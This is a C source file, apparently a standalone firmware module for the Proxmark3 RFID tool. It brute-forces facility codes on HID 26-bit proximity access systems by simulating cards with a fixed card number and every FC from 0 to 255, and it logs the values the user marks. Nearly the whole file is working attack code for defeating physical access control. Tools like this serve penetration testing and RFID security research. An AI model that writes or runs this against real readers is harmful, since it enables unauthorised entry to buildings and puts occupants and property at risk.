/**
 * Bruteforce a HID system using a static card number but incrementing FC
 *
 * This is only going to work if the system has a card number registered that you know,
 * or if you can determine whether a given FC is valid based on external information.
 *
 * Author: proxmark@ss23.geek.nz - ss23
 * Based on lf_hidbrute
 * 
 * To retrieve log file from flash:
 *
 * 1. mem spiffs dump -s lf_hidlfcollect.log -d lf_hidlfcollect.log
 *    Copies log file from flash to your client.
 *
 * 2. exit the Proxmark3 client
 *
 * 3. more lf_hidcollect.log
 *
 * To delete the log file from flash:
 *
 * 1. mem spiffs remove -f lf_hidlfcollect.log
 */

#include "standalone.h"
#include "lf_hidfcbrute.h"

#include "proxmark3_arm.h"
#include "appmain.h"
#include "fpgaloader.h"
#include "lfsampling.h"
#include "util.h"
#include "dbprint.h"
#include "spiffs.h"
#include "ticks.h"
#include "lfops.h"
#include "BigBuf.h"
#include "fpgaloader.h"
#include "parity.h"

// What card number should be used for the bruteforce?
// In some systems, card number 1 is valid, so this may be a good starting point.
#define CARD_NUMBER 1

#define LF_HIDCOLLECT_LOGFILE "lf_hidlfcollect.log"

static void append(uint8_t *entry, size_t entry_len) {
	LED_B_ON();
	DbpString("Writing... ");
	DbpString((char *)entry);
	rdv40_spiffs_append(LF_HIDCOLLECT_LOGFILE, entry, entry_len, RDV40_SPIFFS_SAFETY_SAFE);
	LED_B_OFF();
}

void ModInfo(void) {
	DbpString(_YELLOW_("  LF HID FC Bruteforce"));
}

void RunMod(void) {
	FpgaDownloadAndGo(FPGA_BITSTREAM_LF);
	LFSetupFPGAForADC(LF_DIVISOR_125, true);
	BigBuf_Clear();
	StandAloneMode();
	WDT_HIT();

	LEDsoff();
	LED_A_ON();
	LED_B_ON();
	LED_C_ON();

	rdv40_spiffs_lazy_mount();
	// Buffer for writing to log
	uint8_t entry[81];
	memset(entry, 0, sizeof(entry));
	sprintf((char *)entry, "%s\n", "HID FC Brute");

	// Create the log file
	if (exists_in_spiffs(LF_HIDCOLLECT_LOGFILE)) {
		rdv40_spiffs_append(LF_HIDCOLLECT_LOGFILE, entry, strlen((char *)entry), RDV40_SPIFFS_SAFETY_SAFE);
	} else {
		rdv40_spiffs_write(LF_HIDCOLLECT_LOGFILE, entry, strlen((char *)entry), RDV40_SPIFFS_SAFETY_SAFE);
	}
	LED_B_OFF();

	Dbprintf("Waiting to begin bruteforce");

	// Wait until the user presses the button to begin the bruteforce
	for (;;) {
		// Hit the watchdog timer regularly
		WDT_HIT();
		int button_pressed = BUTTON_HELD(10);
		if ((button_pressed == BUTTON_HOLD) || (button_pressed == BUTTON_SINGLE_CLICK)) {
			break;
		}
	}

	Dbprintf("Running Bruteforce");

	LEDsoff();
	LED_A_ON();

	// Buffer for HID data
	uint32_t high, low;

	for (uint32_t fc = 0; fc < 256; fc++) {
		// Hit the watchdog timer regularly
		WDT_HIT();

		LEDsoff();

		// Toggle LED_C
		if ((fc % 2) == 1) {
			LED_C_ON();
		}

		// If we get USB data, break out
		if (data_available()) break;

		// If a user attempts to hold button, abort the run
		/*
		int button_pressed = BUTTON_HELD(1000); // 1 second
		if (button_pressed == BUTTON_HOLD) {
			break;
		}
		*/
		// If a user pressed the button once, briefly, output the current FC to the log file
		if (BUTTON_PRESS()) {
			memset(entry, 0, sizeof(entry));

			sprintf((char *)entry, "FC: %li\n", fc);
			append(entry, strlen((char *)entry));
		}

		// Calculate data required for a HID card
		hid_calculate_checksum_and_set(&high, &low, 1, fc);

		// Print actual code to brute
		Dbprintf("[=] TAG ID: %x%08x (%d) - FC: %u - Card: %u", high, low, (low >> 1) & 0xFFFF, fc, 1);

		LED_A_ON();
		LED_D_ON();
		StartTicks();
		CmdHIDsimTAGEx(0, high, low, 0, 1, 40000);
		LED_D_OFF();
		StartTicks();
		WaitMS(50);
		StopTicks();
		LED_A_OFF();
	}

	LEDsoff();
}

void hid_calculate_checksum_and_set(uint32_t *high, uint32_t *low, uint32_t cardnum, uint32_t fc) {
	uint32_t newhigh = 0;
	uint32_t newlow = 0;

	newlow = 0;
	newlow |= (cardnum & 0xFFFF) << 1;
	newlow |= (fc & 0xFF) << 17;
	newlow |= oddparity32((newlow >> 1) & 0xFFF);
	newlow |= (evenparity32((newlow >> 13) & 0xFFF)) << 25;

        newhigh |= 0x20; // Bit 37; standard header
        newlow |= 1U << 26; // leading 1: start bit

	*low = newlow;
	*high = newhigh;
}
